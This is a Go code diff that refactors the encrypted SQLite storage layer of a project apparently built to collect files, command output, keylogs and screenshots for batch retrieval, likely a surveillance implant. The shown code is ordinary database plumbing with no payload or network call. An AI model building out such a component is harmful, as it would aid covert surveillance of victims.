@@ -2,20 +2,18 @@ package db
 
 import (
 	"database/sql"
-	"errors"
 	"fmt"
 	"ghostminion/cryptography"
+	"ghostminion/db/dbDataTypes"
 	_ "modernc.org/sqlite"
 	"os"
 	"time"
 )
 
-const (
-	FilesDataType       = "files"
-	CommandsDataType    = "commands"
-	KeylogsDataType     = "keylogs"
-	ScreenshotsDataType = "screenshots"
-)
+type TableConfig struct {
+	Name      string
+	BatchSize int
+}
 
 const dbSchemaFilePath = "./db/schema.sql"
 
@@ -80,70 +78,62 @@ func loadSchema(db *sql.DB) error {
 
 }
 
-func ReadOldestDataRow(table string) (map[string]interface{}, error) {
-	rawQuery := "SELECT * FROM %s WHERE save_time = (SELECT MIN(save_time) FROM %s) LIMIT 1"
-	query := fmt.Sprintf(rawQuery, table, table)
-	row := dbInstance.QueryRow(query)
+func FetchRows(cfg TableConfig) ([]map[string]interface{}, error) {
+	query := fmt.Sprintf(
+		"SELECT * FROM %s ORDER BY save_time ASC LIMIT ?",
+		cfg.Name,
+	)
 
-	columns, err := dbInstance.Query(fmt.Sprintf("PRAGMA table_info(%s)", table))
+	rows, err := dbInstance.Query(query, cfg.BatchSize)
 	if err != nil {
 		return nil, err
 	}
-	defer func(columns *sql.Rows) {
-		err := columns.Close()
-		if err != nil {
+	defer rows.Close()
 
-		}
-	}(columns)
-
-	var colNames []string
-	for columns.Next() {
-		var cid int
-		var name string
-		var typ string
-		var notnull, defaultValue, pk interface{}
-		if err := columns.Scan(&cid, &name, &typ, &notnull, &defaultValue, &pk); err != nil {
-			return nil, err
-		}
-		colNames = append(colNames, name)
-	}
-
-	colValues := make([]interface{}, len(colNames))
-	colPointers := make([]interface{}, len(colNames))
-	for i := range colValues {
-		colPointers[i] = &colValues[i]
-	}
-
-	err = row.Scan(colPointers...)
+	cols, err := rows.Columns()
 	if err != nil {
-		if errors.Is(err, sql.ErrNoRows) {
-			return nil, nil // No data
-		}
 		return nil, err
 	}
 
-	result := make(map[string]interface{})
-	for i, colName := range colNames {
-		result[colName] = colValues[i]
-	}
+	var results []map[string]interface{}
+	for rows.Next() {
+		vals := make([]interface{}, len(cols))
+		ptrs := make([]interface{}, len(cols))
+		for i := range vals {
+			ptrs[i] = &vals[i]
+		}
 
-	if requestID, exists := result["request_id"].(string); exists {
-		err = RemoveOneRow(table, requestID)
-		if err != nil {
+		if err := rows.Scan(ptrs...); err != nil {
 			return nil, err
 		}
+
+		rowMap := make(map[string]interface{})
+		var requestID string
+		for i, col := range cols {
+			rowMap[col] = vals[i]
+			if col == "request_id" {
+				requestID, _ = vals[i].(string)
+			}
+		}
+
+		if requestID != "" {
+			if err := RemoveRow(cfg.Name, requestID); err != nil {
+				return nil, err
+			}
+		}
+
+		results = append(results, rowMap)
 	}
 
-	return result, nil
+	return results, nil
 }
 
-func RemoveOneRow(table string, requestID string) error {
-	// remove by id and not request id
-	_, err := dbInstance.Exec("DELETE FROM ? WHERE request_id = ?", table, requestID)
+func RemoveRow(table string, requestID string) error {
+	_, err := dbInstance.Exec(fmt.Sprintf("DELETE FROM %s WHERE request_id = ?", table), requestID)
 	return err
 }
 
-func WriteDataRow(requestID string, dataType string, data []byte) error {
+func WriteData(requestID string, dataType dbDataTypes.DataType, data []byte) error {
 	data, err := cryptography.EncryptData(data)
 	if err != nil {
 		return err
@@ -153,7 +143,7 @@ func WriteDataRow(requestID string, dataType string, data []byte) error {
 	return err
 }
 
-func WriteLogRow(level string, message []byte) error {
+func WriteLog(level string, message []byte) error {
 	message, err := cryptography.EncryptData(message)
 	if err != nil {
 		return err
